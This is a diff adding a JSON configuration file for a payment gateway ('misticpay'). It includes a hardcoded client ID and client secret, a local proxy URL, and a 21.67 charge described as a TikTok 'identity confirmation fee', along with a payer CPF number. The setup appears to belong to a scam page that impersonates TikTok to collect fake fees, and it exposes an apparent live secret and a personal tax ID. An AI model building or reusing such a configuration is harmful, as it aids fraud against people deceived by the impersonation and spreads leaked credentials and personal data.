@@ -1,0 +1,15 @@
+{
+  "misticpay": {
+    "clientId": "ci_svxjkqrnrhneo4v",
+    "clientSecret": "cs_84tazzxur4losbvvpeik21tjx",
+    "apiBaseUrl": "https://api.misticpay.com/api",
+    "useProxy": true,
+    "proxyUrl": "http://localhost:3000/api/create-transaction"
+  },
+  "payment": {
+    "amount": 21.67,
+    "description": "Taxa de Confirmacao de Identidade - TikTok",
+    "payerName": "Cliente Verificado",
+    "payerCpf": "58050694666"
+  }
+}
